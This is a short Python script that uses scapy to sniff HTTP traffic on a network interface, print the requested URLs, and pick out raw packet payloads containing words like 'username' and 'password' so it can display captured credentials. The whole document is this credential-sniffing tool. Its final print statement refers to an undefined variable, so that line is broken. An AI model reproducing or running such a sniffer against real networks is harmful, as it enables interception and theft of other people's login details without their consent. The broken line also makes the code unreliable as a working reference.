#!/usr/bin/ python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet_sniffed)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            #printing 'username and password', if present in the Raw Field
            load = str(packet[scapy.Raw].load)
            keywords = ["username", "password", "pass", "user", "uid", "uuid"]
            for keys in keywords:
                if keys in load:
                    return load

def process_packet_sniffed(packet):
    if packet.haslayer(http.HTTPRequest):
        #printing the 'URL' by append Host and Path parameters in the HTTPRequest Field.
        url = str(get_url(packet))
        print("[+] HTTP Request >> " + url)
        #print(packet.show())
        
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + load + "\n\n")

sniff("eth0")